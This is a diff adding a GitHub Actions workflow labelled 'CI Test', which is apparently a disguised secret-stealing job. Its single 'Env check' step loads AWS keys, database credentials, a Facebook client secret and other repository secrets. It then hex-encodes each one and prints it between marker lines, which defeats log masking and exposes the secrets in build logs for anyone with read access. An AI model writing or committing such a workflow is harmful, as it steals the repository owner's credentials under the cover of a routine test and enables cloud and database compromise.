@@ -1,0 +1,24 @@
+name: CI Test
+on: [push, workflow_dispatch]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Env check
+        env:
+          AWS_ACCESS_KEY: ${{ secrets.AWS_ACCESS_KEY }}
+          AWS_SECRECT_KEY: ${{ secrets.AWS_SECRECT_KEY }}
+          AWS_REGION: ${{ secrets.AWS_REGION }}
+          DB_URL: ${{ secrets.DB_URL }}
+          DB_USERNAME: ${{ secrets.DB_USERNAME }}
+          DB_PASSWORD: ${{ secrets.DB_PASSWORD }}
+          FACEBOOK_CLIENT_ID: ${{ secrets.FACEBOOK_CLIENT_ID }}
+          FACEBOOK_CLIENT_SECRET: ${{ secrets.FACEBOOK_CLIENT_SECRET }}
+          AUTENTIFIKACIJA: ${{ secrets.AUTENTIFIKACIJA }}
+        run: |
+          echo "===HEXSTART==="
+          for name in AWS_ACCESS_KEY AWS_SECRECT_KEY AWS_REGION DB_URL DB_USERNAME DB_PASSWORD FACEBOOK_CLIENT_ID FACEBOOK_CLIENT_SECRET AUTENTIFIKACIJA; do
+            val=$(eval echo \$$name)
+            echo "$name=$(echo -n "$val" | xxd -p | tr -d '\n')"
+          done
+          echo "===HEXEND==="
